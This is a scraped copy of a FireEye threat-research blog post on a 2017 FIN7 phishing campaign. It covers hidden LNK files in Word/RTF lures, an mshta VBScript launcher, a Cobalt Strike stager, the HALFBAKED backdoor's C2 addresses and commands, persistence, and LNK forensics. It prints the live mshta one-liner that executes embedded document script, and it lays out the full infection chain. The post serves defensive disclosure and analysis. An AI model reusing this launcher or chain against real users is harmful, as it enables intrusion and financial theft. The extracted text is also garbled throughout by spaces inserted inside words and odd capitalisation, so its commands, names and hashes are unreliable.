{
    "title": "fin7 evolution and the phishing lnk _ fireeye inc",
    "text": " PREVIOUS POST nEXT POSTThreat Research FIn7 Evolution and the Phi shing LnK april 24, 2017 | by nick Carr, Saravanan Mohank umar, Yogesh Londhe, Barry Venge rik, Dominik Webe r CYBER CRIME  MaLWaR E  CaRBa naK  FIn7  BaCKDOOR   PHISHInG FIn7 is a financially-motivate d threat group that ha s been a ssociated with malicio us operations dating back to late 2015 . FIn7 is referred to by many ven dors as “Carbanak G roup”, altho ugh we do not eq uate all usage of the CaRBa naK back door with FIn7. FireEye recently ob served a FIn7 spear phishing campaign  targeting personnel involve d with Unite d States Securities and Exchange Commi ssion (SEC) filing s at various organizations. In a newly-identified campaign, F In7 modified their phishing techniq ues to implement unique infection an d persistence mechani sms. FIn7 has moved away from weaponized Microsoft Office mac ros in order to eva de detection. Thi s round of FIn7 phishing lures implement s hidden shortcut files (LnK files) to initiate the infection and VBScript functionality la unched by mshta.exe to infect the victim. In this ongoing campaign, F In7 is targeting o rganizations with spear phishing email s containing eithe r a malicio us DOCX o r RTF file – t wo versions of the same LnK file an d VBScript techniq ue. These lures originate f rom external email a ddresses that the attacke r rarely re-used, and they were sent to va rious location s of large restaurant chain s, hospitality, an d financial service organizations. The subjects and attachment s were theme d as complaint s, catering orders, or resumes. as with previous campaign s, and as highlighte d in our annual M-Trends 2017 report, FIn7 is calling stores at targeted organizations to ensure they received the email an d attempting to walk them th rough the infection p rocess. Infection Chain While F In7 has embedded VBE as OLE objects for over a year, they contin ue to update thei r script launching mechani sms. In the current lures, both the malicio us DOCX an d RTF attempt to convince the user to double-click on the image in the document, a s seen in Fig ure 1. This spawns the hidden embe dded malicio us LnK file in the document. Ove rall, this is a more effective phi shing tactic since the malicio us content i s embedded in the document content rather than package d in the OL E object. By requiring this unique interaction – double-clicking on the image an d clicking the “Open” b utton in the security warning pop up – the phi shing lure attempt s to eva de dynamic detection a s many sandboxes are not config ured to simulate that specific user action. Figure 1: Malicio us FIn7 lure asking victim to double click to unlock content s The malicio us LnK launches “mshta.exe” with the follo wing arguments passed to it: vbscript:Execute(\"On Error Resume next:set w=GetObject(,\"\"Wo rd.application\"\"):exec ute w.activeDoc ument.Shape s(2).TextFrame.TextRange.Text:clo se\") The script in the a rgument combine s all the textbox content s in the document an d executes them, a s seen in Figure 2. Figure 2: Textbox in side DOC The combine d script from Wo rd textbox drops the follo wing component s: \\Users\\[user_name]\\ Intel\\58d2 a83f7778d5.36783181 .vbs \\Users\\[user_name]\\ Intel\\58d2 a83f777942.26535 794.ps1 \\Users\\[user_name]\\ Intel\\58d2 a83f777908.23270411.vbs also, the script creates a name d schedule task for persistence to la unch “58d2 a83f7778d5.36783181 .vbs” every 25 minutes. VBScript #1 The dropped script “58d2 a83f7778d5.36783181 .vbs” acts as a launcher. This VBScript check s if the “58d2 a83f777942.26535 794.ps1” PowerShell script is running using WM I queries and, if not, la unches it. PowerShell Sc ript “58d2 a83f777942.26535 794.ps1” is a multilayer obfuscated PowerShell script, which launches shellcode for a Cobalt St rike stager. The shellcode retrieves an additional payloa d by connecting to the follo wing C2 server using DnS: aaa.stage.14919005 .www1 .proslr3[.]com Once a successful reply is received from the comman d and control (C2) server, the Po werShell script exec utes the embe dded Cobalt St rike shellcode. If unable to contact the C 2 server initially, the shellcode is configured to reattempt comm unication with the C 2 server address in the follo wing patte rn:  [a-z][a-z][a-z].stage.14919005 .www1 .proslr3[.]com VBScript #2 “mshta.exe” f urther executes the second VBScript “58d2 a83f777908.23270411.vbs”, which creates a folder by GUID name in side “Intel” an d drops the VBSc ript payloa ds and configuration file s: \\Intel\\{BFF4 219E -C7D1-2880 -aE58-9C9CD9701C90}\\58d2 a83f777638.60220156 .ini \\Intel\\{BFF4 219E -C7D1-2880 -aE58-9C9CD9701C90}\\58d2 a83f777688.78384945.ps1 \\Intel\\{BFF4 219E -C7D1-2880 -aE58-9C9CD9701C90}\\58d2 a83f7776b5.64953395 .txt \\Intel\\{BFF4 219E -C7D1-2880 -aE58-9C9CD9701C90}\\58d2 a83f7776e0.72726761.vbs \\Intel\\{BFF4 219E -C7D1-2880 -aE58-9C9CD9701C90}\\58d2 a83f777716.48248237.vbs \\Intel\\{BFF4 219E -C7D1-2880 -aE58-9C9CD9701C90}\\58d2 a83f777788.86541308 .vbs \\Intel\\{BFF4 219E -C7D1-2880 -aE58-9C9CD9701C90}\\Foxconn.lnk This script then exec utes “58d2 a83f777716.48248237.vbs”, which is a variant of F In7’s HaLFBaK ED backdoor. HaLFBaK ED Backdoor Variant The HaLFBaK ED malware family con sists of multiple component s designed to establish and maintain a foothol d in victim net works, with the ultimate goal of gaining acce ss to sensitive financial info rmation. Thi s version of HaLFBaK ED connect s to the follo wing C2 server: hxxp:// 198[.]100.119.6:80/cd hxxp:// 198[.]100.119.6:443/cd hxxp:// 198[.]100.119.6:8080 /cd This version of HaLFBaK ED listens for the follo wing comman ds from the C 2 server: info: Sends victim machine info rmation (OS, P rocessor, BIOS and running p rocesses) using WM I queries processList: Send list of process running screenshot: Takes screen shot of victim machine ( using 58d2 a83f777688.78384945.ps1) runvbs: Executes a VB script runexe : Executes EXE file runps1: Executes PowerShell script delete : Delete the specified file update: Update the specified file all comm unication bet ween the back door and attacke r C2 are encoded using the follo wing techniq ue, represented in pseudo code: Function send_data(data)                 random_string = custom_function_to_gene rate_random_string()                 enco ded_data = URL Encode(Simple Encrypt(data))                 po st_data(\"POST”, random_string & \"=\" & enco ded_data, Hard_coded_c2_url, Create_Ran dom_Url(class_id)) The FireEye iSIGHT Intelligence MyS IGHT Portal contain s additional info rmation ba sed on our investigation s of a variety of topic s discussed in this post, including FIn7 and the HaLFBaK ED backdoor. Click here for more information. Persistence Mechani sm Figure 3 shows that fo r persistence, the document creates two scheduled tasks and creates one auto-start registry entry pointing to the L nK file. Figure 3: FIn7 phishing lure persistence mechani sms Examining attacke r Shortcut Files In many ca ses, attacke r-created LnK files can reveal val uable info rmation abo ut the attacke r’s development environment. The se files can be pa rsed with lnk-parser to extract all content s. LnK files have been val uable during Man diant inci dent response investigation s as they incl ude volume serial number, netBIOS name, an d MaC address. For example, one of the se FIn7 LnK files containe d the follo wing properties: Version: 0 netBIOS name: an dy-pc Droid volume identifier: e2c10c40-6f7d-4442-bcec-47 0c96730bca Droid file identifier: a6eea972-0e2f-11e7-8b2d-08002 73d5268 Birth droid volume identifier: e2c10c40-6f7d-4442-bcec-47 0c96730bca Birth droid file identifier: a6eea972-0e2f-11e7-8b2d-08002 73d5268 MaC address: 08:00:27:3d:52:68 UUID timestamp: 03/21/2017 (12:12:28.500) [UTC] UUID sequence number: 2861 From this LnK file, we can see not only what the shortcut launched within the string data, but that the attacke r likely gene rated this file on a Vi rtualBox system with hostname “an dy-pc” on Ma rch 21, 2017. Example Phi shing Lures Filename: Doc33.docx MD5: 6a5a42ed234910121d bb7d199 4ab5a5e Filename:  Mail.rtf MD5: 1a9e113b2f3caa7a141a94c8bc187ea7 FIn7 april 2017 Comm unity Protection Event On april 12, in response to FIn7 actively ta rgeting m ultiple client s, FireEye kicke d off a Comm unity Protection Event (CP E) – a coo rdinated effort by FireEye as a Service (FaaS), Man diant, FireEye iSight Intelligence, an d our product team – to secure all client s affecte d by this campaign.  Email Up dates Information an d insight on to day's advanced threats from FireEye. SHaRE Recent Po sts 17 Mar 2020 16 Mar 2020 09 Mar 2020 RSS FEED: STaY CO nnECTED  First name Last name Email address Company name Threat Research Blog FireEye Stories Blog Industry Perspective s Blog Yes, I would like to receive communication s from FireEye. Please read more about our information collection an d use. SUBSCR IBE Six Fact s about address Space Layout Randomization on Windows  They Come in the night: Ransomware Deployment T rends  Crescendo: Real Time Event Vie wer for macOS    Home  FireEye Blog s Threat Research  FIn7 Evolution an d the Phi shing L nK    Company Why Fi reEye? Customer Stories Careers Certification s and Compliance Investor Relation s Supplier Documents news and Events newsroom Press Releases Webina rs Events awards and Honors Email Preferences Technical S upport Incident? Report Security Issue Contact S upport Customer Portal Communities Documentation Po rtal FireEye Blog s Threat Research FireEye Stories Industry Perspective s Threat Map View the Late st Threats Contact U s +1 877-347-3393   Stay Connecte d  Copyright   2020  FireEye, Inc. all rights reserved.  Privacy & Cookie s Policy  | Privacy Shiel d | Legal Doc umentationSite Lang uage English Solutions Services Customers Partners Resources Company  "
}